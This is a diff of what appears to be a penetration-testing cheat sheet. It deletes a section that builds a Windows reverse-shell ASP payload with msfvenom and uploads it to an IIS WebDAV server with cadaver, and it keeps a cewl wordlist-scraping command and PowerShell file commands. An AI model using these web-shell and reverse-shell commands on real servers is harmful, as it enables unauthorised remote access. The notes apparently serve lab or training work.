@@ -13,16 +13,7 @@ Rename-Item -Path <String> -NewName <String>
 
 Remove-Item -Path "C:\Path\To\YourFile.txt"
 ```
----
-# cadaver(IIS server /webdav exploit)
-```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.2 LPORT=4444 -f asp > shell.asp
 
-cadavar <ip>
-
-put shell.asp
-```
----
 # cewl(Custom Word List generator)
 ```bash
 cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
